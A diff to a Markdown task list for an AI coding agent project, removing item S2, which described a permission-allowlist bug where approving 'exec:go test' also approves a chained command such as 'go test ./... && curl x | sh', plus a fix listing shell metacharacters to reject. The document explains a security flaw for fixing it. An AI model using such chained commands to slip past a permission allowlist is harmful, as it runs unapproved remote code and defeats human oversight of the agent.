@@ -16,7 +16,7 @@ Effort: XS < 30 min · S ≈ 1–2 h · M ≈ half a day · L ≈ a day or more.
 
 ## Order
 
-2. S2, B1, B10
+2. B1, B10
 3. S1
 4. B4 + B5 + B6 together (resume and the result store share the cause)
 5. B8, B9, B12, B13, then the rest of the cleanup
@@ -32,11 +32,6 @@ Effort: XS < 30 min · S ≈ 1–2 h · M ≈ half a day · L ≈ a day or more.
   `models.*`). All other keys apply only once the project is trusted, recorded in
   `~/.ykode/trusted.json` as root → sha256 of the file. Any change to the file asks again;
   print a warning that names the ignored keys.
-- **S2 · S · The allowlist approves chained commands.** `normalizeKey`
-  (`internal/agent/permissions.go`) keeps the first two words, so `exec:go test` also
-  approves `go test ./... && curl x | sh`, and `exec:ls` never matches `ls -la`.
-  → A command containing `;` `&` `|` `` ` `` `$(` `>` `<` or a newline never matches and
-  is never stored by "always". Match by word prefix of any length.
 
 ## Bugs
 
